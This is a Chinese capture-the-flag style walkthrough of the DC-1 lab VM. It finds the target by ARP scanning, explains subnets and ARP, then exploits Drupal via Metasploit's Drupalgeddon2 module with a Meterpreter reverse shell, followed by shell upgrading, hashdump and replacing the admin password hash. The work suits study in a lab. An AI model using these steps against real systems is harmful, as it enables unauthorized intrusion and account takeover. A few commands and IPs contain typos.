# 寻找靶机IP

我们成功开启了虚拟机，但是我们还需要知道靶机的IP地址，探测主机的工具有很多，最常见的有arp-scan、nmap、netdiscover

# arp-scan

sudo arp-scan -l

arp-scan：发送ARP请求，把收到的响应显示出来（ARP（Address Resolution Protocol，地址解析协议）请求：局域网中用来通过IP地址查找对应MAC地址的一种广播询问）

-l：是--localnet的简写，根据所选网卡的IPv4地址和子网掩码，自动确定要扫描的本地网段

通过大量的ARP请求，然后就可以根据哪些主机返回了ARP应答，就能快速列出局域网内的存活主机、IP和MAC地址

我们可以在开启靶场的虚拟机设置里面找到MAC地址：

执行完arp请求之后我们可以看到类似如下界面的结果：

根据对应的MAC地址，我们不难发现靶机IP为192.168.152.129

# nmap

由于攻击机和靶机处在同一个局域网/子网里面，所以首先我们需要通过ifconfig命令获取攻击机直接连接的网段，扫描这个网段就可以覆盖靶机最可能出现的范围

ifconfig

我们重点关注eth0里面的inet、netmask、broadcast三个字段，这里的eth0是Kali的网络接口，lo是本机回环接口

  • inet：Kali自己的IPv4地址
  • netmask：子网掩码
  • broadcast：广播地址

从图中我们可以得到我的Kali的IP为192.168.152.128，子网掩码是255.255.255.0

IPv4地址一共有32位，分成四组，每组八位，子网掩码决定哪些位属于网络部分，哪些属于主机部分，255.255.255.0转换为二进制为11111111.11111111.11111111.00000000，其中1表示网络位，0表示主机位

​ 该图片由ChatGPT生成

因此网络位总共有24位，而主机位总共有8位

网络地址用于标识一个子网，而不是某一台具体的计算机，我这里的网络地址为192.168.152.0（因为在/24这个网段中，当所有的主机位都为0时，得到的就是网络地址）

那么这里是怎么得出来的/24呢？

/24是根据子网掩码255.255.255.0得出来的，关键在于子网掩码转换为二进制之后，有多少个连续的1就是/后面的数字，同理可得：

子网掩码 二进制中1的数量 CIDR写法
255.0.0.0 8 /8
255.255.0.0 16 /16
255.255.255.0 24 /24
255.255.255.128 25 /25
255.255.255.192 26 /26
255.255.255.240 28 /28

我们在之前提到/后面的数字代表了有多少个主机位，其中八个主机位，每一位都可以是0或1，所以总共有[ \underbrace{2\times2\times2\times2\times2\times2\times2\times2}_{8\text{ 个二进制位}} =2^8=256 ]，256个不同组合，在常见的/24子网中，需要保留两个特殊地址，其中192.168.152.0为网络地址，192.168.152.255为广播地址，最后得到可用主机地址数为254个，范围为192.168.152.1~192.168.152.254

什么是广播地址呢？

广播地址用于向同一个IPv4子网中的所有设备发送广播数据

  • 广播：假设在VMWare中搭建了如下网络

    现在假设Kali想发送网络数据，有常见的两种情况：

    • 单播（Unicast）：Kali只想给DC-1发送数据：

      源IP：192.168.214.128
目标IP：192.168.214.130

      类似于给某个人单独发送一条消息

    • 广播（Broadcast）：Kali想给同一个局域网中的所有设备发送一条消息

      源IP：192.168.214.128
目标IP：192.168.214.255

      类似于在包含所有广播可达地址的群聊里面发送消息让所有成员都能收到

  • 广播域（Broadcast Domain）：一个广播数据帧能够到达的网络范围，例如：

    网络A：192.168.214,0/24

kali：192.168.214.128
DC-1:192.168.214.130
设备B：192.168.214.131

    如果这三台设备连接在同一个普通二层虚拟网络中，那么Kali发出的以太网广播帧通常能到达另外两台设备，假设还有一个网络：

    网络B：192.168.100.0/24

设备D：192.168.100.10

    设备D位于另一个由路由器隔开的网络，那么Kali的普通广播不会自动传过去，因为路由器默认不会转发这种广播到其他子网

    广播域是根据二层网络连接和VLAN等因素划分的，并不完全由IP网段决定，两个设备的IP在同一个/24网段，不代表他们一定处于同一个广播域

接下来就是用nmap进行主机实现了：

nmap -sv 192.168.152.0/24

在理解Nmap为什么能利用ARP发现靶机之前，我们先理解ARP为什么需要广播

假设VMware虚拟网络中有两台虚拟机

Kali想给DC-1发送数据目标IP：192.168.2144.130（假设主机位为130），这里存在一个问题是：在常见的以太网局域网中，发送IP数据包时，需要把它封装在以太网帧中，而以太网帧需要填写目标IP的MAC地址，可以简记为IP地址用于标识网络中的设备以及跨网络寻址，MAC地址用于当前以太网链路中传递数据帧

但是现在Kali只知道DC-1的IP，却不知道MAC地址，这时候就需要ARP（Address Resolution Protocol地址解析协议），它主要用于在IPv4局域网中解析IP地址对应的MAC地址

ARP请求为什么需要广播：发送ARP请求时，Kali目前并不知道这个MAC地址，它无法直接向DC-1单播发送以太网帧，常见以太网环境中数据大致是这样封装的：

因为单播需要知道目标MAC，所以这个ARP请求会通过以太网广播发送：

广播帧的MAC地址为FF:FF:FF:FF:FF:FF，该地址表示将帧广播给当前二层广播域内的设备，DC-1发现192.168.214.130是自己的IP，于是回复，其他设备发现请求的IP不是自己的，通常不回复，因此广播的作用就是让Kali在不知道目标MAC地址的情况下找到拥有指定IPv4地址的设备

由于DC-1收到的ARP请求中已经包含Kali的IP地址和MAC地址，所以DC-1知道应该把回复发送给谁，也就不需要再次广播，这个APR回复通常采用单播

Nmap所做的事情其实是针对一个网段中的多个IP地址发送ARP请求，然后根据收到的回复判断哪些地址有主机在使用，例如nmap -sn 192.168.152.0/24，Nmap可能分别发送这样的ARP请求：

Who has 192.168.214.1?
Who has 192.168.214.2?
Who has 192.168.214.3?
...
Who has 192.168.214.130?

Nmap收到对应的ARP回复之后就有证据判断回复IP对应的主机在当前网络中处于活动状态

接下来我们只需要对比DC-1靶场的MAC地址就可以找到对应的靶机IP

# 攻击Drupal

接下来我们可以使用工具metasploit查找漏洞（目前世界上领先的渗透测试工具，也是信息安全与渗透测试领域最大的开源项目之一），它的主要用途包括搜索与选择模块，配置攻击参数，执行漏洞利用，管理会话

msfconsole
search Drupal

可以选择等级最高的漏洞模块并且时间最新，也就是图中的2018年的漏洞

# 使用漏洞模块编号
use 1
# 使用漏洞名称
use exploit/unix/webapp/drupal_drupalgeddon2

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

系统提示还没有选择攻击载荷（payload），因此自动选择默认的php/meterpreter/reverse_tcp（php Meterpreter连接），这是因为Drupal是一个web应用，漏洞执行的是php代码

msf exploit(unix/webapp/drupal_drupalgedden2) >

成功进入Drupalgeddon2漏洞利用模块（CVE-2018-7600，著名的Drupal远程代码执行漏洞）

# 查看需要配置哪些参数
show options

Current Setting是目前设置的内容，Required表示是否需要设置内容，yes为必须设置，no可以设置也可以不设置

重点关注Required（是否为必须）为yes的项：

RHOSTS：当前为空，需要设置为目标靶机的IP地址（Current Setting）
RPORT：当前为80，代表目标web服务的端口，如果对方开启了8080或其他端口则需要修改
TARGETURI：当前为/，代表Drupal站点的安装路径，如果Drupal装在/drupal/目录下，这里就必须改为/drupal/
PHP_FUNC：设置为passthru，这是漏洞利用时用来执行系统命令的php函数

VHOST/SSL/Proxies：这些是可选的高级选项，通常保持默认即可（除非目标绑定了特定的域名或者需要走代理）

Payload options（载荷选项）：这一部分是在成功利用漏洞之后，让目标机器回连到电脑的配置，由于我们用的是反向连接（reverse_tcp），所以需要配置自己电脑的监听地址：

LHOST：当前设置是192.168.152.128，为我的Kali（攻击机）机器的IP地址，要确保这个IP是靶机可以访问到的（比如在同一个内网，或者通过公网IP/VPS）
LPORT：当前为4444，为我的本地监听的端口，只要不被占用保持默认也行

Exploit target（利用目标）：这里只有一个选项0 Automatic (PHP In-Memory)，表示自动利用，并将PHP Payload直接在内存中执行

解释完接下来我们回到攻击流程，由于缺少RHOSTS，所以我们需要设置：

set RHOSTS 192.168.152.129

# 检查是否成功
show options

配置成功之后我们就可以执行run开始攻击了

  • Started reverse TCP handler on 192.168.152.128:4444：攻击机在本地4444端口开启了监听，等待目标机器主动连接回来（反向shell）
  • Running automatic check ...：模块正在自动检测目标是否存在漏洞
  • [!] The service is running, but could not be validated：提示目标web服务正在运行，但自动检测无法确切验证漏洞是否存在，这在Drupalgeddon2中很常见，很多情况下自动检查会失败（因为版本或配置差异），但不影响实际的攻击
  • Sending stage (40004 bytes) to 192.168.152.129：漏洞利用成功执行，攻击机正在向目标机器发送Meterpreter的载荷代码（Stage）
  • Meterpreter session 1 opened (192,.168.152.128:4444 -> 192.168.152.129:39472) at ...：这代表目标机器成功执行了载荷，并且主动连接回了4444端口
    • Meterpreter session 1：表示成功建立了一个会话，编号为1
    • 192.168.152.129:39427：目标机器随机分配的端口号

现在我们已经拿到了目标机器的控制权限，在当前msf的提示符下，可以输入以下命令来实现操作会话

# 查看当前所有会话
session -l

# 进入（交互）会话1
session -i 1

进入Meterpreter会话之后，常用的基础命令如下：

  • sysinfo：查看目标系统信息（操作系统、主机名、架构等）
  • getuid：查看当前获取到的权限（如www-data）
  • shell：进入目标系统的标准命令行Shell，通常是Linux Bash
  • background：将当前的会话挂起到后台（返回msf主界面，方便进行其他操作）
  • hashdump（需要高权限）：尝试抓取系统密码哈希
  • ls / pwd / cd：浏览目标机器文件系统

既然刚才提到了shell才能进入靶机标准命令行，我们现在所处的环境是什么呢？

当前所处环境是一个Meterpreter会话，为Metasploit专门提供的内存后渗透工具（Meterpreter）环境，它是刚才发送过去的Payload（php/meterpreter/reverse_tcp）在目标机器内存中成功执行后建立的，运行在靶机的内存中（PHP In-Memory），它没有在硬盘上留下明显的二进制文件，隐蔽性很强，这里我们输入的ls是Meterpreter自带的命令，而不是Linux，通过Meterpreter的API调用目标系统的底层功能来列出文件

这样我们就拿到了第一个flag：Every good CMS needs a config file - and so do you.，提示我们需要找配置文件

在许多参考文章中都提到了可以用python pty模块升级为交互式shell（前提是受害机有python和获得一个反向shell），可以变得更加简洁美观：

python -c 'import pty;pty.spawn("/bin/bash")'

参考：分享：忘记Drupal的管理员密码的解决办法 | Drupal中国

通过drupal加密密码的脚本加密一个知道的密码，把加密得到的字符串和admin的pass进行替换，加密文件脚本路径在/var/www/scripts/password-hash.sh

<?php

/**
 * Drupal hash script - to generate a hash from a plaintext password
 *
 * Check for your PHP interpreter - on Windows you'll probably have to
 * replace line 1 with
 *   #!c:/program files/php/php.exe
 *
 * @param password1 [password2 [password3 ...]]
 *  Plain-text passwords in quotes (or with spaces backslash escaped).
 */

if (version_compare(PHP_VERSION, "5.2.0", "<")) {
  $version  = PHP_VERSION;
  echo <<<EOF

ERROR: This script requires at least PHP version 5.2.0. You invoked it with
       PHP version {$version}.
\n
EOF;
  exit;
}

$script = basename(array_shift($_SERVER['argv']));

if (in_array('--help', $_SERVER['argv']) || empty($_SERVER['argv'])) {
  echo <<<EOF

Generate Drupal password hashes from the shell.

Usage:        {$script} [OPTIONS] "<plan-text password>"
Example:      {$script} "mynewpassword"

All arguments are long options.

  --help      Print this page.

  --root <path>

              Set the working directory for the script to the specified path.
              To execute this script this has to be the root directory of your
              Drupal installation, e.g. /home/www/foo/drupal (assuming Drupal
              running on Unix). Use surrounding quotation marks on Windows.

  "<password1>" ["<password2>" ["<password3>" ...]]

              One or more plan-text passwords enclosed by double quotes. The
              output hash may be manually entered into the {users}.pass field to
              change a password via SQL to a known value.

To run this script without the --root argument invoke it from the root directory
of your Drupal installation as

  ./scripts/{$script}
\n
EOF;
  exit;
}

$passwords = array();

// Parse invocation arguments.
while ($param = array_shift($_SERVER['argv'])) {
  switch ($param) {
    case '--root':
      // Change the working directory.
      $path = array_shift($_SERVER['argv']);
      if (is_dir($path)) {
        chdir($path);
      }
      break;
    default:
      // Add a password to the list to be processed.
      $passwords[] = $param;
      break;
  }
}

define('DRUPAL_ROOT', getcwd());

include_once DRUPAL_ROOT . '/includes/password.inc';
include_once DRUPAL_ROOT . '/includes/bootstrap.inc';

foreach ($passwords as $password) {
  print("\npassword: $password \t\thash: ". user_hash_password($password) ."\n");
}
print("\n");

这个脚本用php写的，还能用php加参数运行，直接得到加密后的密码
